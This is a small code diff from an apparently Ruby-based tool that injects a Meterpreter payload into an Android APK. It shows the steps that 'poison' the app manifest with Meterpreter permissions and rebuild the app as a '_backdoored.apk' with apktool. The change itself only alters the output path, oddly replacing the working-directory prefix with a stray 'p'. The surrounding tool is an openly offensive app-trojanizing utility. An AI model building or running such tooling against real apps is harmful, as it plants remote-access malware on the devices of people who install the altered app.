@@ -226,7 +226,7 @@ injected_apk+="_backdoored.apk"
 puts "[8] Poisoning the manifest with meterpreter permissions".yellow + "\n"
 fix_manifest(d_payload,d_original)
 puts "[9] Rebuilding #{apkfile} with meterpreter injection as ".yellow + File.basename(injected_apk)+ "\n"
-`$(pwd)/embed_tools/apktool.sh b -o $(pwd)/#{injected_apk} #{d_original}`
+`$(pwd)/embed_tools/apktool.sh b -o p#{injected_apk} #{d_original}`
 unless (File.readable?(injected_apk))
 puts "[-] Error creating injection APK,If you haven't Android-SDK please install it.".red
 exit(1);
